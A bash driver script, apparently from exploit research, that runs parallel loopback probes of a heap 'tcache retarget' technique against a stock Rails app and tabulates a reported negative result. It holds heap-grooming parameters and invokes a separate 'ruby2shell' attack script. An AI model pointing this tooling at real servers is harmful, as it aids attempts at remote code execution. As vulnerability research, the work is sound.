#!/bin/bash
# Bounded consH-20 low-byte tcache-retarget probe on an unmodified
# `rails new --minimal` app. Analysis only, loopback only: the preload tracer
# records whether a request-thread allocation or free ever touches the forged
# window. No grade claim; this is the reproduction driver for the report's
# "consH-20 low-byte tcache retarget" negative.
set -u
cd "$(dirname "$0")/../.." || exit 1

TAG="${RUBY2SHELL_RETARGET_TAG:-consH20-replay}"
COUNT="${RUBY2SHELL_RETARGET_COUNT:-24}"
BASE="${RUBY2SHELL_RETARGET_BASE:-0}"
PORT_BASE="${RUBY2SHELL_RETARGET_PORT:-4560}"
# 1 = the documented four-byte tail qword (last four _method bytes replaced).
TAIL="${RUBY2SHELL_RETARGET_TAIL:-1}"
export TAG PORT_BASE

export RUBY2SHELL_STOCK_CASE_PROBE=1
export RUBY2SHELL_STOCK_N=524
export RUBY2SHELL_STOCK_DRAIN=1024:32
export RUBY2SHELL_STOCK_DRAIN_FAKE=1
export RUBY2SHELL_STOCK_FILL=256
export RUBY2SHELL_STOCK_FILL_PREV=0x250
export RUBY2SHELL_STOCK_FILL_SIZE=0x90
export RUBY2SHELL_STOCK_PART_CHARSET=1
if [ "$TAIL" = 1 ]; then
  export RUBY2SHELL_STOCK_TAIL_HEX=00005102
fi

seq "$BASE" "$((BASE + COUNT - 1))" | xargs -P6 -I{} bash -c '
  i={}
  RUBY2SHELL_STOCK_PORT=$((PORT_BASE + i % 6)) \
    bash lab/repro/ruby2shell-stock-rails.sh attack "${TAG}-${i}" >/dev/null 2>&1
' _ 2>/dev/null
# xargs returns 123 when any probe aborts pre-response, which is expected:
# a pre-response SIGABRT is itself a recorded outcome, not a driver failure.

python3 lab/repro/ruby2shell-cons-vis-tabulate.py "$TAG"
